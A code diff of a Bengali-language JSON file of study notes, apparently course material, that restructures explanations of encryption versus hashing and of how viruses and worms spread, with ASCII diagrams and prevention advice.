-            "sub": "একই plaintext দুবার encrypt করলে সাধারণত ভিন্ন ciphertext হয়, কারণ প্রতিবার আলাদা IV/nonce মেশানো হয়।"
+            "sub": "একই plaintext দুবার encrypt করলে সাধারণত ভিন্ন ciphertext হয়।"
+          },
+          {
+            "sub": "কারণ প্রতিবার আলাদা IV বা nonce মেশানো হয়।"
           },
           {
             "sub": "ব্যবহার: যেখানে data পরে আবার পড়তে হবে — HTTPS/TLS traffic, disk encryption, সংরক্ষিত card বা account তথ্য।"
           },
-          "Hashing — কীভাবে চলে",
           {
-            "sub": "Key লাগে না। Password এর ক্ষেত্রে salt (প্রতি ব্যবহারকারীর আলাদা random মান, digest এর পাশে জমা থাকে) যোগ করা হয়; sender যাচাই করতে হলে HMAC এ key ব্যবহার হয়।"
+            "diagram": "ENCRYPTION — দুই-মুখী (reversible)\n\n   plaintext \"Bank@123\"\n        │\n        │   [ KEY ]\n        ▼\n   ENCRYPT (AES)\n        │\n        ▼\n   ciphertext \"9f2Ka+Lm...\"   ──── network ────┐\n                                                │\n                                                ▼\n                                        DECRYPT (AES)\n                                                │   [ একই KEY ]\n                                                ▼\n                                        plaintext \"Bank@123\"\n\n   একই key দিয়ে হুবহু ফিরিয়ে আনা যায়\n   উদ্দেশ্য: CONFIDENTIALITY — data পরে আবার পড়তে হবে",
+            "label": "Diagram — Encryption (দুই-মুখী)"
+          },
+          "Hashing — কীভাবে চলে:",
+          {
+            "sub": "Key লাগে না।"
           },
           {
-            "sub": "Output এর দৈর্ঘ্য নির্দিষ্ট — SHA-256 এ input যাই হোক (২ অক্ষর বা ১ GB video), digest সবসময় 256 bit।"
+            "sub": "Password এর ক্ষেত্রে salt যোগ করা হয় — প্রতি ব্যবহারকারীর আলাদা random মান, digest এর পাশে জমা থাকে।"
           },
           {
-            "sub": "একই input সবসময় একই digest দেয় (deterministic)। এই কারণেই আগে থেকে বানানো rainbow table কাজ করে, আর সেটা ঠেকাতেই salt দরকার।"
+            "sub": "Sender যাচাই করতে হলে HMAC এ key ব্যবহার হয়।"
           },
           {
-            "sub": "ব্যবহার: password সংরক্ষণ, file/download এর integrity checksum, digital signature (আগে hash, পরে sign), blockchain, git commit id।"
+            "sub": "Output এর দৈর্ঘ্য নির্দিষ্ট — SHA-256 এ input যাই হোক, digest সবসময় 256 bit।"
           },
-          "Password যাচাইয়ের ব্যবহারিক ফল: server কখনো আসল password জানে না — signup এ digest জমা রাখে, login এ যা লেখা হলো তা আবার hash করে দুই digest মেলায়। তাই DB চুরি হলেও password সরাসরি পাওয়া যায় না।",
-          "Password এর জন্য SHA-256 নয়, bcrypt / argon2 / PBKDF2 ব্যবহার করতে হয় — এগুলো ইচ্ছাকৃতভাবে ধীর, ফলে অনুমান করে করে মেলানোর (brute force) খরচ অনেক বেড়ে যায়।"
+          {
+            "sub": "একই input সবসময় একই digest দেয় (deterministic)।"
+          },
+          {
+            "sub": "এ কারণেই আগে থেকে বানানো rainbow table কাজ করে, আর সেটা ঠেকাতেই salt দরকার।"
+          },
+          {
+            "sub": "ব্যবহার: password সংরক্ষণ, file বা download এর integrity checksum।"
+          },
+          {
+            "sub": "ব্যবহার: digital signature (আগে hash, পরে sign), blockchain, git commit id।"
+          },
+          {
+            "diagram": "HASHING — এক-মুখী (irreversible)\n\n   input \"Bank@123\"\n        │\n        ▼\n   SHA-256\n        │\n        ▼\n   digest  6f4b2c...e91          (সবসময় 64 hex character)\n        │\n        ▼\n      X   ফেরার কোনো operation নেই — decrypt বলে কিছু নেই\n\n   উদ্দেশ্য: INTEGRITY / VERIFICATION — আসলটা আর ফেরত লাগবে না",
+            "label": "Diagram — Hashing (এক-মুখী)"
+          },
+          "Password যাচাইয়ের ব্যবহারিক ফল:",
+          {
+            "sub": "Server কখনো আসল password জানে না।"
+          },
+          {
+            "sub": "Signup এ শুধু digest জমা রাখে।"
+          },
+          {
+            "sub": "Login এ যা লেখা হলো তা আবার hash করে দুই digest মেলানো হয়।"
+          },
+          {
+            "sub": "তাই DB চুরি হলেও password সরাসরি পাওয়া যায় না।"
+          },
+          "Password এ কোন algorithm ব্যবহার করতে হবে:",
+          {
+            "sub": "SHA-256 নয় — bcrypt, argon2 বা PBKDF2 ব্যবহার করতে হয়।"
+          },
+          {
+            "sub": "এগুলো ইচ্ছাকৃতভাবে ধীর।"
+          },
+          {
+            "sub": "ফলে অনুমান করে করে মেলানোর (brute force) খরচ অনেক বেড়ে যায়।"
+          },
+          {
+            "diagram": "Password যাচাই — hashing কেন যথেষ্ট\n\n Signup:\n   \"Bank@123\"  ──SHA-256──►  6f4b2c...e91  ──►  DB তে জমা\n                                                 (আসল password কোথাও নেই)\n\n Login:\n   ব্যবহারকারী লিখল \"Bank@123\"\n        │\n        ├──SHA-256──►  6f4b2c...e91\n        │                    │\n        │                 compare\n        │                    ▼\n        └──────────►  DB: 6f4b2c...e91   →  মিলেছে, login ok\n\n DB চুরি হলেও শুধু digest পাওয়া যায়, password নয়\n\n\nOutput length — পার্থক্যটা এখানেই স্পষ্ট\n\n   Encryption:  5 byte input  →  ~16 byte ciphertext\n                1 MB file     →  ~1 MB ciphertext\n                (input বাড়লে output-ও বাড়ে)\n\n   Hashing:     \"hi\"          →  64 hex char (256 bit)\n                1 GB video    →  64 hex char (256 bit)\n                (input যাই হোক, দৈর্ঘ্য একই)\n\n\nএক নজরে:\n   Encryption = তালা — চাবি আছে, তাই আবার খোলা যায়\n   Hashing = আঙুলের ছাপ — ছাপ থেকে মানুষ বানানো যায় না, শুধু মেলানো যায়",
+            "label": "Diagram — Password যাচাই ও output length"
+          }
         ],
-        "diagram": "[১] ENCRYPTION — দুই-মুখী (reversible)\n\n   \"Bank@123\"                                    \"Bank@123\"\n        │                                              ▲\n        ▼                                              │\n   ┌─────────┐   ciphertext                      ┌─────────┐\n   │ ENCRYPT │──▶ \"9f2Ka+Lm...\" ──── network ───▶│ DECRYPT │\n   │  (AES)  │                                   │  (AES)  │\n   └────▲────┘                                   └────▲────┘\n        │                                             │\n     [ KEY ]                                       [ KEY ]\n        └──────── একই key ফিরিয়ে আনতে পারে ──────────┘\n\n   উদ্দেশ্য: CONFIDENTIALITY — data পরে আবার পড়তে হবে\n\n\n[২] HASHING — এক-মুখী (irreversible)\n\n   \"Bank@123\"\n        │\n        ▼\n   ┌──────────┐\n   │ SHA-256  │──▶ 6f4b2c...e91   (সবসময় ৬৪ hex char)\n   └──────────┘         │\n        ▲               │\n        │               ▼\n        └────  ╳╳╳  ────┘  ← ফেরার কোনো operation নেই\n              (no decrypt)\n\n   উদ্দেশ্য: INTEGRITY / VERIFICATION — আসলটা আর ফেরত লাগবে না\n\n\n[৩] Password যাচাই — hashing কেন যথেষ্ট\n\n   Signup:  \"Bank@123\" ──SHA-256──▶ 6f4b2c...e91 ──▶ DB\n                                                     (আসল password কোথাও নেই)\n\n   Login:   ব্যবহারকারী লিখল \"Bank@123\"\n                     │\n                     ├──SHA-256──▶ 6f4b2c...e91\n                     │                   │\n                     │              compare (মিলিয়ে দেখা)\n                     │                   ▼\n                     └──────────▶  DB: 6f4b2c...e91  → মিলেছে, login ok\n\n   DB চুরি হলেও শুধু digest পাওয়া যায়, password নয়\n\n\n[৪] Output length\n\n   Encryption:  ৫ byte input   →  ~১৬ byte ciphertext\n                ১ MB file      →  ~১ MB ciphertext      (input বাড়লে output বাড়ে)\n\n   Hashing:     \"hi\"           →  ৬৪ hex char (256 bit)\n                ১ GB video     →  ৬৪ hex char (256 bit)  (input যাই হোক, একই দৈর্ঘ্য)\n\n\n[৫] এক নজরে\n\n   Encryption = তালা          → চাবি আছে, তাই আবার খোলা যায়\n   Hashing    = আঙুলের ছাপ   → ছাপ থেকে মানুষ বানানো যায় না, শুধু মেলানো যায়",
         "mistakes": [
           [
             "Hashing হলো এক ধরনের encryption",
@@ -552,31 +931,102 @@
         "points": [
           "Replication — কীভাবে বংশবৃদ্ধি করে:",
           {
-            "sub": "Virus: নিজের কোডের কপি অন্য executable, document macro বা boot sector এর ভেতরে জুড়ে দেয়। সংক্রমিত file টাই পরবর্তী বাহক — virus এর নিজের কোনো স্বাধীন অস্তিত্ব নেই।"
+            "sub": "Virus: নিজের কোডের কপি অন্য executable, document macro বা boot sector এর ভেতরে জুড়ে দেয়।"
           },
           {
-            "sub": "Worm: নিজের পূর্ণাঙ্গ কপি আলাদা process/file হিসেবে তৈরি করে; কোনো host file কে সংক্রমিত করার দরকারই হয় না।"
-          },
-          "Spread — কীভাবে ছড়ায়:",
-          {
-            "sub": "Virus: সংক্রমিত file হাতবদল হলে — pen drive, email attachment, pirated software, শেয়ার করা file server। User ওই file টি execute করা মাত্র virus সক্রিয় হয়ে ওই machine এর অন্য file গুলোকে সংক্রমিত করে।"
+            "sub": "সংক্রমিত file টাই পরবর্তী বাহক — virus এর নিজের কোনো স্বাধীন অস্তিত্ব নেই।"
           },
           {
-            "sub": "Worm: নিজে থেকেই IP range scan করে দুর্বল host খুঁজে বের করে, vulnerability exploit করে ভেতরে ঢুকে নিজেকে কপি করে চালিয়ে দেয়; email contact list এ নিজেকে পাঠিয়েও ছড়াতে পারে। প্রতিটি নতুন host সাথে সাথে পরবর্তী scanner হয়ে যায়।"
+            "sub": "Worm: নিজের পূর্ণাঙ্গ কপি আলাদা process বা file হিসেবে তৈরি করে।"
           },
-          "User action: virus এর জন্য আবশ্যক (ক্লিক/execute/copy), worm এর জন্য একেবারেই দরকার নেই — ব্যবহারিক দিক থেকে এটিই সবচেয়ে বড় পার্থক্য।",
-          "গতি ও পরিসর: virus এর বিস্তার ধীর ও সীমিত (যতটুকু মানুষ file টা ছড়ায়); worm exponential হারে ছড়ায় — মিনিটের মধ্যে হাজার host সংক্রমিত হতে পারে।",
+          {
+            "sub": "কোনো host file কে সংক্রমিত করার দরকারই হয় না।"
+          },
+          "Spread — Virus কীভাবে ছড়ায়:",
+          {
+            "sub": "সংক্রমিত file হাতবদল হলে — pen drive, email attachment, pirated software, শেয়ার করা file server।"
+          },
+          {
+            "sub": "User ওই file টি execute করা মাত্র virus সক্রিয় হয়।"
+          },
+          {
+            "sub": "তারপর সেটি ওই machine এর অন্য file গুলোকেও সংক্রমিত করে।"
+          },
+          {
+            "diagram": "VIRUS — host file এর গায়ে জুড়ে বসে, বাহক মানুষ\n\n  PC-1\n  ┌────────────────────────┐\n  │  game.exe              │\n  │    └── [ VIRUS code ]  │   ← virus কোড file এর ভেতরে ঢুকে বসেছে\n  └────────────────────────┘\n        │\n        │  user double-click করল\n        ▼\n  একই PC এর অন্য file ও সংক্রমিত হলো  (report.doc, setup.exe …)\n        │\n        │  user নিজে বয়ে নিল — pen drive / email attachment\n        ▼\n  PC-2\n  ┌────────────────────────┐\n  │  infected file present │   ← কিন্তু কেউ না চালালে\n  └────────────────────────┘      virus থেমেই থাকে",
+            "label": "Diagram — Virus"
+          },
+          "Spread — Worm কীভাবে ছড়ায়:",
+          {
+            "sub": "নিজে থেকেই IP range scan করে দুর্বল host খুঁজে বের করে।"
+          },
+          {
+            "sub": "Vulnerability exploit করে ভেতরে ঢুকে নিজেকে কপি করে চালিয়ে দেয়।"
+          },
+          {
+            "sub": "Email contact list এ নিজেকে পাঠিয়েও ছড়াতে পারে।"
+          },
+          {
+            "sub": "প্রতিটি নতুন host সাথে সাথে পরবর্তী scanner হয়ে যায়।"
+          },
+          {
+            "diagram": "WORM — standalone, network দিয়ে নিজেই হেঁটে যায়\n\n   HOST A (worm)\n        │\n        │  port scan + vulnerability exploit\n        ├──────────────►  HOST B (worm)\n        │                      │\n        │                      └──────────────►  HOST D (worm)\n        │\n        └──────────────►  HOST C (worm)\n                               │\n                               └──────────────►  HOST E (worm)\n\n   কোনো host file নেই, কোনো click নেই\n   প্রতিটি নতুন host নিজেই পরের scanner হয়ে যায়\n   সংখ্যা বাড়ে:  1 → 2 → 4 → 8 → …  (exponential)",
+            "label": "Diagram — Worm"
+          },
+          "User action — সবচেয়ে বড় ব্যবহারিক পার্থক্য:",
+          {
+            "sub": "Virus এর জন্য user action আবশ্যক — click, execute বা copy করতে হবে।"
+          },
+          {
+            "sub": "Worm এর জন্য user action একেবারেই দরকার নেই।"
+          },
+          "গতি ও পরিসর:",
+          {
+            "sub": "Virus এর বিস্তার ধীর ও সীমিত — যতটুকু মানুষ file টা ছড়ায় ততটুকুই।"
+          },
+          {
+            "sub": "Worm exponential হারে ছড়ায় — মিনিটের মধ্যে হাজার host সংক্রমিত হতে পারে।"
+          },
           "ক্ষতির ধরন:",
           {
-            "sub": "Virus: file মুছে ফেলা বা corrupt করা, data নষ্ট করা, program এর আচরণ বদলে দেওয়া, boot sector নষ্ট করে system অচল করা।"
+            "sub": "Virus: file মুছে ফেলা বা corrupt করা, data নষ্ট করা।"
           },
           {
-            "sub": "Worm: bandwidth, CPU ও memory খেয়ে network slow বা down করে দেওয়া; বেশিরভাগ আধুনিক worm ছড়ানোর পাশাপাশি backdoor বা ransomware payload বসিয়ে যায়।"
+            "sub": "Virus: program এর আচরণ বদলে দেওয়া, boot sector নষ্ট করে system অচল করা।"
           },
-          "উদাহরণ: Virus — Melissa (macro virus), CIH/Chernobyl। Worm — Morris Worm, Blaster, Conficker, WannaCry (worm-এর মতো ছড়ানো ransomware)।",
-          "প্রতিরোধ ভিন্ন: virus ঠেকাতে antivirus signature scanning ও অচেনা file/attachment না চালানো; worm ঠেকাতে সময়মতো security patch, firewall/segmentation এবং অপ্রয়োজনীয় port ও service বন্ধ রাখা — কারণ worm কে থামানোর জায়গা network, ব্যবহারকারী নয়।"
+          {
+            "sub": "Worm: bandwidth, CPU ও memory খেয়ে network slow বা down করে দেওয়া।"
+          },
+          {
+            "sub": "Worm: বেশিরভাগ আধুনিক worm ছড়ানোর পাশাপাশি backdoor বা ransomware payload বসিয়ে যায়।"
+          },
+          "উদাহরণ:",
+          {
+            "sub": "Virus — Melissa (macro virus), CIH বা Chernobyl।"
+          },
+          {
+            "sub": "Worm — Morris Worm, Blaster, Conficker, WannaCry (worm-এর মতো ছড়ানো ransomware)।"
+          },
+          "প্রতিরোধ দুটোর জন্য ভিন্ন:",
+          {
+            "sub": "Virus ঠেকাতে antivirus signature scanning চালাতে হয়।"
+          },
+          {
+            "sub": "Virus ঠেকাতে অচেনা file বা attachment না চালানোই মূল রক্ষা।"
+          },
+          {
+            "sub": "Worm ঠেকাতে সময়মতো security patch দিতে হয়।"
+          },
+          {
+            "sub": "Worm ঠেকাতে firewall ও network segmentation ব্যবহার করতে হয়।"
+          },
+          {
+            "sub": "অপ্রয়োজনীয় port ও service বন্ধ রাখতে হয়।"
+          },
+          {
+            "sub": "কারণ worm কে থামানোর জায়গা network, ব্যবহারকারী নয়।"
+          }
         ],
-        "diagram": "VIRUS — host file এর গায়ে জুড়ে বসে, বাহক মানুষ\n\n   ┌──────────────── PC-1 ────────────────┐\n   │   game.exe ┌─────┐                   │\n   │            │ VIR │ ← virus কোড file  │\n   │            └─────┘   এর ভেতরে ঢুকেছে │\n   │        │                             │\n   │        └─ user double-click করলে     │\n   │           virus সক্রিয় → একই PC এর   │\n   │           report.doc, setup.exe ও    │\n   │           সংক্রমিত হয়                │\n   └────────────────┬─────────────────────┘\n                    │ user নিজে বয়ে নেয়\n                    │ (pen drive / email attachment)\n                    ▼\n   ┌──────────────── PC-2 ────────────────┐\n   │  file টা কেউ না চালালে কিছুই ঘটে না  │ ← মানুষ না নাড়লে\n   └──────────────────────────────────────┘    virus থেমে থাকে\n\n\nWORM — standalone, network দিয়ে নিজেই হেঁটে যায়\n\n                     ┌────────┐\n               ┌────►│ HOST B │────┐\n               │     │ (worm) │    │\n   ┌────────┐  │     └────────┘    ▼\n   │ HOST A │──┤   port scan +   ┌────────┐\n   │ (worm) │  │   vulnerability │ HOST D │\n   └────────┘  │      exploit    │ (worm) │\n               │     ┌────────┐  └────────┘\n               └────►│ HOST C │──────▲\n                     │ (worm) │──────┘\n                     └────────┘\n   কোনো host file নেই, কোনো click নেই — প্রতিটি নতুন host\n   নিজেই পরের scanner হয় → 1 → 2 → 4 → 8 … বিস্ফোরণ\n\n────────────────────────────────────────────────\n              VIRUS                WORM\n   বাহক   │ host file লাগে    │ কিছুই লাগে না (standalone)\n   ট্রিগার │ user এর click     │ সম্পূর্ণ স্বয়ংক্রিয়\n   গতি    │ ধীর, মানুষনির্ভর  │ দ্রুত, network-নির্ভর\n   ক্ষতি  │ file ও data নষ্ট  │ bandwidth শেষ, network ধস",
         "table": {
           "headers": [
             "ভিত্তি",
